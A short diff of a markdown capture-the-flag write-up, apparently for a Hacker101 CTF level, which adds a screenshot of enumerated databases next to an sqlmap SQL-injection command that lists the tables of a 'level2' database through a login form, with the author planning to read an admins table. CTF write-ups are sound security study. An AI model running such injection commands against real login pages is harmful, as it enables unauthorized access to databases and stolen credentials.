@@ -32,6 +32,9 @@ Im getting this message as well, im gonna go ahead and try to vulnerate only the
 
 Finally got some results! I got all the databases, im gonna take a look into level2 database
 
+![sqlmap_databases](sqlmap_databases.png)
+
+
 `sqlmap -u "https://{HEX_VALUE_HERE}.ctf.hacker101.com/login" --data="username=admin&password=admin" --method=POST -D level2 --tables`
 
 Lets get into admins table and see its columns
